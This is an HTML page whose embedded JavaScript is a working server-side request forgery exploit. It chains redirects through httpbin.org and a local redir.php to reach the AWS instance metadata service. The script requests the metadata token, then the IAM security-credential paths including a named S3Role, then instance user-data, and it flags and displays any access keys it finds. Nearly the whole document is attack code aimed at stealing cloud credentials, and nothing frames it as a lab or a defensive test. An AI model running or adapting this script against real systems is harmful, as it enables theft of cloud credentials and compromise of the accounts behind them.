<!DOCTYPE html>
<html>
<head>
    <title>Simple Token Verification</title>
</head>
<body>
    <h1>🔍 Simple Token Verification Test</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Test the exact endpoint that returned 12 bytes earlier
        results += "<h2>🔐 AWS Metadata Token Endpoint Test</h2>";
        results += "<p>Earlier result: 'Chain 10: http://169.254.169.254/latest/api/token SUCCESS: 12 bytes'</p>";
        
        try {
            // The exact chain that worked before
            var tokenUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/api/token';
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenUrl), false);
            xhr.send();
            
            results += "<div style='background:#e8f5e8;padding:15px;border:2px solid green;'>";
            results += "<strong>Token Endpoint Response:</strong><br>";
            results += "Length: " + xhr.responseText.length + " bytes<br>";
            results += "Content: <code style='background:#fff;padding:5px;'>" + xhr.responseText + "</code><br>";
            results += "Content (hex): <code style='background:#fff;padding:5px;'>" + xhr.responseText.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ') + "</code>";
            results += "</div>";
            
            // Check if this looks like a valid token
            var text = xhr.responseText.trim();
            if(text.length > 5 && !text.includes('401') && !text.includes('Unauthorized')) {
                results += "<div style='background:#32cd32;color:white;padding:10px;'>🎯 Potential Valid Token Response!</div>";
                
                // Now try to use this token to access metadata
                results += "<h3>🔑 Testing Token Usage</h3>";
                
                // Test basic metadata access
                var metadataTests = [
                    'http://169.254.169.254/latest/meta-data/',
                    'http://169.254.169.254/latest/meta-data/iam/',
                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role'
                ];
                
                for(var i = 0; i < metadataTests.length; i++) {
                    var testUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=' + metadataTests[i];
                    var testXhr = new XMLHttpRequest();
                    testXhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(testUrl), false);
                    testXhr.send();
                    
                    results += "<h4>Test: " + metadataTests[i].split('169.254.169.254/')[1] + "</h4>";
                    results += "<div style='background:#f0f0f0;padding:8px;'>Response (" + testXhr.responseText.length + " bytes): " + testXhr.responseText.substring(0, 100) + "...</div>";
                    
                    if(testXhr.responseText.includes('AccessKeyId') || testXhr.responseText.includes('SecretAccessKey')) {
                        results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;text-align:center;'>🚨🚨🚨 CREDENTIALS FOUND! 🚨🚨🚨</div>";
                    }
                }
            } else {
                results += "<div style='background:#ffeaa7;padding:10px;'>⚠️ Token response might be an error message</div>";
            }
            
        } catch(e) {
            results += "<div style='background:#ffe8e8;padding:10px;'>❌ Error: " + e.message + "</div>";
        }
        
        // Also test user data which might contain credentials
        results += "<h2>📄 AWS User Data Test</h2>";
        results += "<p>User data often contains bootstrap scripts with AWS credentials</p>";
        
        try {
            var userDataUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/';
            var userXhr = new XMLHttpRequest();
            userXhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(userDataUrl), false);
            userXhr.send();
            
            results += "<div style='background:#e8f5e8;padding:10px;'>User Data Response (" + userXhr.responseText.length + " bytes):</div>";
            
            if(userXhr.responseText.includes('AWS_ACCESS_KEY') || userXhr.responseText.includes('export AWS') || userXhr.responseText.includes('aws configure')) {
                results += "<div style='background:#ff0000;color:white;padding:15px;border:4px solid red;text-align:center;'>🎉 AWS CREDENTIALS IN USER DATA! 🎉</div>";
            }
            
            results += "<div style='background:#f0f0f0;padding:10px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + userXhr.responseText + "</div>";
            
        } catch(e) {
            results += "<div style='background:#ffe8e8;padding:10px;'>❌ User data error: " + e.message + "</div>";
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
